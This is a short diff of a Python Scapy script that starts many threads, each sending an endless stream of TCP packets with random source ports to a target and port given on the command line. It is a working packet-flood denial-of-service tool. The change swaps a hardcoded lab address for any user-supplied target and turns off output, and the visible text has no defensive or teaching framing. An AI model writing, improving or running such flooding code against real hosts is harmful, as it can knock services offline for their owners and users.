@@ -11,12 +11,12 @@ if len(sys.argv) !=  4:
 target = sys.argv[1]
 port = int(sys.argv[2])
 threads = int(sys.argv[3])
-print("press Ctrl+C to stop...")
+print("press Ctrl+Z to stop...")
 
 def synflood(target, port):
 	while 1:
 		x = random.randint(1024, 65535)
-		send(IP(dst = '10.10.10.134')/TCP(dport=port, sport = x, flags='FS'))
+		send(IP(dst=target)/TCP(dport=port, sport=x, flags='FS'), verbose=0)
 
 for i in range(threads):
 	Thread(target=synflood, args=(target,port)).start()
